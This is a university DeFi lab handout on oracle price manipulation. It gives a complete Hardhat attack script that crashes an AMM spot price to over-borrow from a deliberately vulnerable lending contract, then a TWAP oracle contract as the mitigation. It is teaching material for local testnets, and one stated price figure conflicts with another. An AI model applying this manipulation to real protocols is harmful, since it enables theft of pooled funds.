# Lab 4: Oracle Price Manipulation & TWAP Mitigation

> COMP 5568 - Decentralized Finance (Semester 2, 2025/26)
>
> The Hong Kong Polytechnic University

This lab guides you through deploying a simple DeFi oracle system, performing a price manipulation attack, and then implementing a Time-Weighted Average Price (TWAP) oracle as a mitigation. In this lab, you will learn:

- How DeFi protocols use on-chain price oracles to determine asset values.
- How attackers exploit spot-price oracles via large trades (simulating flash-loan-style attacks).
- How TWAP oracles resist single-block manipulation by averaging prices over time.

**Prerequisites:** Node.js (v16+), npm, basic familiarity with Hardhat and Solidity.



## Task 0: Lab Setup

Download lab materials from: https://github.com/EvanBin/COMP5568_Labs

Change to lab4 directory:

```bash
cd lab4_oracle
npm install
```

### 

## Task 1: Deploy an Example Oracle Protocol

In this part you will deploy two ERC-20 tokens, a simple AMM exchange (which doubles as a **spot-price oracle**), and a lending contract that trusts that oracle.

- For `contracts/SimpleExchange.sol`, this AMM uses the constant-product formula \($x \times y = k$\). It exposes a `getSpotPrice()` function that returns the current price of Token A in terms of Token B based on the reserve ratio.
  - **Key insight:** `getSpotPrice()` reads the *current* reserve ratio. Anyone who can move the reserves (by trading) can instantly change the price the oracle reports.
- For `contracts/VulnerableLending.sol`, this contract lets users deposit Token B as collateral and borrow Token A. It uses the exchange's spot price to value collateral — this is the vulnerability.

### Step 1.1: Deploy the contracts

In your terminal, run:

```bash
npx hardhat node
```

In **another terminal**, run the deploy script:

```bash
npx hardhat run scripts/deploy.js --network localhost
```

**Expected output:** You should see addresses for all contracts and a spot price of approximately **100.0** (meaning 1 TKA = 100 TKB).



## Task 2: Experience Price Manipulation

Now you will play the role of an attacker who manipulates the spot price by dumping a large amount of Token A into the exchange, crashing the price, and then borrowing more than they should from the lending contract.

### Step 2.1: Create the attack script

Create `scripts/attack.js`:

```javascript
const hre = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const e18 = hre.ethers.parseEther;
  const fmt = hre.ethers.formatEther;

  // --- Fresh deployment for clean state ---
  const TokenA = await hre.ethers.getContractFactory("TokenA");
  const tokenA = await TokenA.deploy(e18("2000000"));
  const TokenB = await hre.ethers.getContractFactory("TokenB");
  const tokenB = await TokenB.deploy(e18("2000000"));
  const Exchange = await hre.ethers.getContractFactory("SimpleExchange");
  const exchange = await Exchange.deploy(
    await tokenA.getAddress(),
    await tokenB.getAddress()
  );
  const Lending = await hre.ethers.getContractFactory("VulnerableLending");
  const lending = await Lending.deploy(
    await tokenA.getAddress(),
    await tokenB.getAddress(),
    await exchange.getAddress()
  );

  // Setup: add liquidity (1 TKA = 100 TKB)
  await tokenA.approve(await exchange.getAddress(), e18("10000"));
  await tokenB.approve(await exchange.getAddress(), e18("1000000"));
  await exchange.addLiquidity(e18("10000"), e18("1000000"));

  // Fund lending pool
  await tokenA.approve(await lending.getAddress(), e18("50000"));
  await lending.fundPool(e18("50000"));

  // Give attacker some tokens
  await tokenA.transfer(attacker.address, e18("100000"));
  await tokenB.transfer(attacker.address, e18("5000"));

  console.log("=== BEFORE ATTACK ===");
  const priceBefore = await exchange.getSpotPrice();
  console.log("Spot price (TKB per TKA):", fmt(priceBefore));

  // --- ATTACK STEP 1: Attacker dumps Token A to crash the price ---
  console.log("\n🔴 Attacker dumps 90,000 TKA into the exchange...");
  const attackAmount = e18("90000");
  await tokenA.connect(attacker).approve(await exchange.getAddress(), attackAmount);
  await exchange.connect(attacker).swapAForB(attackAmount);

  const priceAfter = await exchange.getSpotPrice();
  console.log("Spot price AFTER manipulation:", fmt(priceAfter));
  console.log(
    "Price dropped by",
    (100 - (Number(fmt(priceAfter)) / Number(fmt(priceBefore))) * 100).toFixed(1) + "%"
  );

  // --- ATTACK STEP 2: Attacker deposits small collateral and borrows a lot ---
  console.log("\n🔴 Attacker deposits only 5,000 TKB as collateral...");
  await tokenB.connect(attacker).approve(await lending.getAddress(), e18("5000"));
  await lending.connect(attacker).depositCollateral(e18("5000"));

  // With crashed price, collateral is now worth much more in TKA terms
  const collateralValueInA = (BigInt(e18("5000")) * BigInt(1e18)) / BigInt(priceAfter);
  const maxBorrow = (collateralValueInA * 100n) / 150n;
  console.log("Collateral appears worth (in TKA):", fmt(collateralValueInA));
  console.log("Attacker can borrow up to (TKA):", fmt(maxBorrow));

  // Borrow the maximum
  const borrowAmount = maxBorrow - 1n; // slight buffer
  await lending.connect(attacker).borrow(borrowAmount);
  console.log("Attacker borrows:", fmt(borrowAmount), "TKA");

  console.log("\n=== RESULT ===");
  console.log(
    "With only 5,000 TKB (~50 TKA at fair price),",
    "the attacker borrowed", fmt(borrowAmount), "TKA!"
  );
  console.log("This is the oracle manipulation exploit! 💥");
}

main().catch(console.error);

```



### Step 2.2: Run the attack

```bash
npx hardhat run scripts/attack.js --network localhost
```

**What to observe:**

- The spot price drops drastically (from ~100 to ~10) after the large swap.
- With the manipulated price, 5,000 TKB of collateral appears to be worth far more Token A than it really is.
- The attacker borrows many more TKA tokens than they should — this is the exploit.

> **Discussion:** In a real attack, an attacker would use a **flash loan** to borrow the tokens for the dump, manipulate the price, exploit the lending protocol, and repay the flash loan — all in a single transaction. The core issue is the same: the lending contract trusts a price that can be changed instantly.



## Task 3: TWAP Mitigation

A Time-Weighted Average Price (TWAP) oracle resists manipulation because it averages the price over a time window. Even if an attacker moves the spot price for one block, the TWAP barely changes because it considers many historical price snapshots.

### Step 3.1: Create the TWAP Oracle

Create `contracts/TWAPOracle.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IExchange {
    function getSpotPrice() external view returns (uint256);
}

contract TWAPOracle {
    IExchange public exchange;

    struct Observation {
        uint256 timestamp;
        uint256 priceCumulative;
    }

    Observation[] public observations;
    uint256 public lastPrice;

    constructor(address _exchange) {
        exchange = IExchange(_exchange);
    }

    // Record the current spot price. Should be called periodically.
    function update() external {
        uint256 currentPrice = exchange.getSpotPrice();
        uint256 currentTime = block.timestamp;

        if (observations.length == 0) {
            observations.push(Observation({
                timestamp: currentTime,
                priceCumulative: 0
            }));
            lastPrice = currentPrice;
            return;
        }

        Observation memory last = observations[observations.length - 1];
        uint256 timeElapsed = currentTime - last.timestamp;

        if (timeElapsed == 0) return; // already updated this block

        // Add price * time to the cumulative sum
        uint256 newCumulative = last.priceCumulative + (lastPrice * timeElapsed);
        observations.push(Observation({
            timestamp: currentTime,
            priceCumulative: newCumulative
        }));
        lastPrice = currentPrice;
    }

    // Get the TWAP over the most recent `window` seconds
    function getTWAP(uint256 window) external view returns (uint256) {
        require(observations.length >= 2, "Need at least 2 observations");

        Observation memory latest = observations[observations.length - 1];
        uint256 targetTime = latest.timestamp - window;

        // Find the observation closest to targetTime
        uint256 bestIndex = 0;
        for (uint256 i = 0; i < observations.length; i++) {
            if (observations[i].timestamp <= targetTime) {
                bestIndex = i;
            }
        }

        Observation memory old = observations[bestIndex];
        uint256 timeElapsed = latest.timestamp - old.timestamp;

        if (timeElapsed == 0) return lastPrice; // fallback

        return (latest.priceCumulative - old.priceCumulative) / timeElapsed;
    }

    function getObservationCount() external view returns (uint256) {
        return observations.length;
    }
}
```

> **How it works:** The TWAP oracle accumulates `price × time` at each update. To compute the average price over a window, it subtracts two cumulative values and divides by the elapsed time. This is the same approach used by Uniswap V2's built-in TWAP oracle.
>
> **Important detail:** When `update()` is called, it weights the *previous* price (`lastPrice`) over the elapsed time, then stores the *current* spot price as the new `lastPrice`. This means a price change only starts accumulating into the TWAP **after** the next `update()` call following a time advance. This is by design — it mirrors how Uniswap V2 uses the price at the *start* of each interval.



### Step 3.2: Create the mitigation demo script

Create `scripts/twap_demo.js`:

```javascript
const hre = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const e18 = hre.ethers.parseEther;
  const fmt = hre.ethers.formatEther;

  // Helper: advance time and mine a block
  async function advanceTime(seconds) {
    await hre.network.provider.send("evm_increaseTime", [seconds]);
    await hre.network.provider.send("evm_mine");
  }

  // --- Fresh deployment for clean state ---
  const TokenA = await hre.ethers.getContractFactory("TokenA");
  const tokenA = await TokenA.deploy(e18("2000000"));
  const TokenB = await hre.ethers.getContractFactory("TokenB");
  const tokenB = await TokenB.deploy(e18("2000000"));
  const Exchange = await hre.ethers.getContractFactory("SimpleExchange");
  const exchange = await Exchange.deploy(
    await tokenA.getAddress(),
    await tokenB.getAddress()
  );

  // Add liquidity: 1 TKA = 100 TKB
  await tokenA.approve(await exchange.getAddress(), e18("10000"));
  await tokenB.approve(await exchange.getAddress(), e18("1000000"));
  await exchange.addLiquidity(e18("10000"), e18("1000000"));

  // Deploy TWAP Oracle
  const TWAP = await hre.ethers.getContractFactory("TWAPOracle");
  const twap = await TWAP.deploy(await exchange.getAddress());
  await twap.waitForDeployment();
  console.log("TWAP Oracle deployed at:", await twap.getAddress());

  // ============================================================
  // PHASE 1: Build price history (10 observations, 1 per minute)
  // ============================================================
  console.log("\n📊 Building TWAP price history (10 observations over 10 minutes)...\n");

  for (let i = 0; i < 10; i++) {
    await twap.update();
    const spot = await exchange.getSpotPrice();
    console.log(`  Observation ${i + 1}: spot = ${fmt(spot)} TKB/TKA`);
    await advanceTime(60);
  }
  // Final update to close the last 60-second interval
  await twap.update();

  const spotBefore = await exchange.getSpotPrice();
  const twapBefore = await twap.getTWAP(600);
  console.log("\n=== BEFORE ATTACK ===");
  console.log("Spot price:      ", fmt(spotBefore), "TKB/TKA");
  console.log("TWAP (10-min):   ", fmt(twapBefore), "TKB/TKA");

  // ============================================================
  // PHASE 2: Attack — dump Token A to crash spot price
  // ============================================================
  console.log("\n🔴 Attacker dumps 90,000 TKA into the exchange...");
  await tokenA.transfer(attacker.address, e18("100000"));
  await tokenA.connect(attacker).approve(await exchange.getAddress(), e18("90000"));
  await exchange.connect(attacker).swapAForB(e18("90000"));

  const spotAfterAttack = await exchange.getSpotPrice();
  console.log("Spot price AFTER attack:", fmt(spotAfterAttack), "TKB/TKA");

  // ============================================================
  // PHASE 3: Observe TWAP after short manipulation (1 minute)
  // ============================================================
  // Advance 1 minute with the manipulated price, then update twice
  // (first update records the manipulated price into lastPrice,
  //  second update accumulates it into the cumulative sum)
  await advanceTime(5);    // small gap so first update() succeeds
  await twap.update();     // records manipulated price into lastPrice
  await advanceTime(55);   // rest of the 1-minute window
  await twap.update();     // now the manipulated price is weighted in

  const twapAfter1Min = await twap.getTWAP(600);
  console.log("\n=== AFTER 1 MINUTE OF MANIPULATION ===");
  console.log("Spot price:      ", fmt(spotAfterAttack), "TKB/TKA");
  console.log("TWAP (10-min):   ", fmt(twapAfter1Min), "TKB/TKA");

  const spotDrop = (100 - (Number(fmt(spotAfterAttack)) / Number(fmt(spotBefore))) * 100).toFixed(1);
  const twapDrop1 = (100 - (Number(fmt(twapAfter1Min)) / Number(fmt(twapBefore))) * 100).toFixed(1);
  console.log(`\nSpot price dropped by:  ${spotDrop}%`);
  console.log(`TWAP dropped by only:   ${twapDrop1}%`);

  // ============================================================
  // PHASE 4: Observe TWAP after extended manipulation (5 minutes)
  // ============================================================
  // Keep the manipulated price for 4 more minutes (total 5 min)
  for (let i = 0; i < 4; i++) {
    await advanceTime(60);
    await twap.update();
  }

  const twapAfter5Min = await twap.getTWAP(600);
  console.log("\n=== AFTER 5 MINUTES OF MANIPULATION ===");
  console.log("Spot price:      ", fmt(spotAfterAttack), "TKB/TKA");
  console.log("TWAP (10-min):   ", fmt(twapAfter5Min), "TKB/TKA");

  const twapDrop5 = (100 - (Number(fmt(twapAfter5Min)) / Number(fmt(twapBefore))) * 100).toFixed(1);
  console.log(`\nSpot price dropped by:  ${spotDrop}%`);
  console.log(`TWAP dropped by:        ${twapDrop5}%`);

  // ============================================================
  // Summary
  // ============================================================
  console.log("\n" + "=".repeat(55));
  console.log("SUMMARY");
  console.log("=".repeat(55));
  console.log(`Spot price drop:                      ${spotDrop}%`);
  console.log(`TWAP drop after 1 min manipulation:   ${twapDrop1}%`);
  console.log(`TWAP drop after 5 min manipulation:   ${twapDrop5}%`);
  console.log("=".repeat(55));
  console.log("\n✅ Key takeaway: The longer the attacker must hold the");
  console.log("manipulated price, the more it costs (arbitrageurs would");
  console.log("restore the price). A flash loan attack lasts only 1 block,");
  console.log("so TWAP is nearly immune to it.");
  console.log("\nA lending protocol using TWAP instead of spot price");
  console.log("would NOT allow the attacker to over-borrow.");
}

main().catch(console.error);
```

This script demonstrates three scenarios side by side:

1. **Before attack** — spot and TWAP both read ~100.
2. **Short manipulation (1 minute)** — spot crashes 99%, but TWAP drops only ~10%.
3. **Long manipulation (5 minutes)** — even holding the manipulation for 5 minutes, TWAP only drops ~50%, still far from the 99% spot crash.



### Step 3.3: Run the TWAP demo

```bash
npx hardhat run scripts/twap_demo.js --network localhost
```

**What to observe:**

- The spot price crashes ~99% instantly (from ~100 to ~1).
- After **1 minute** of manipulation, the 10-minute TWAP only drops about **~10%**. A lending protocol using this TWAP would still correctly value collateral.
- Even after **5 minutes** of sustained manipulation (which would be extremely costly in real DeFi), the TWAP only drops about **~50%** — still far from the 99% spot crash.
- A flash loan attack only lasts a single block (seconds), so it would barely move the TWAP at all.



## TWAP Conceptual Summary

The TWAP formula computes a weighted average where the weight is time duration:

$\text{TWAP}(t_k, t_n) = \frac{\sum_{i=k}^{n-1} P_i \cdot \Delta T_i}{T_n - T_k}$

where $P_i$ is the price at observation $i$, and $\Delta T_i = T_{i+1} - T_i$ is how long that price lasted.

**Why this resists manipulation:**

| Factor | Spot Price Oracle | TWAP Oracle |
|--------|-------------------|-------------|
| Price source | Current reserve ratio | Average over time window |
| Manipulation cost | One large trade | Must sustain distorted price for the entire window |
| Flash loan attack | Fully vulnerable | Resistant — flash loans last only 1 block |
| Trade-off | Always current | Slightly lagging behind real price |

An attacker would need to hold the manipulated price for the entire TWAP window (e.g., 30 minutes in production systems) to significantly move the average — this is economically infeasible because arbitrageurs would restore the price.



## Further Reading

- [What are Price Oracle Manipulation Attacks in DeFi?](https://www.halborn.com/blog/post/what-are-price-oracle-manipulation-attacks-in-defi)
- [Ormer: A manipulation-resistant and gas-efficient blockchain pricing oracle for defi](https://arxiv.org/pdf/2410.07893)

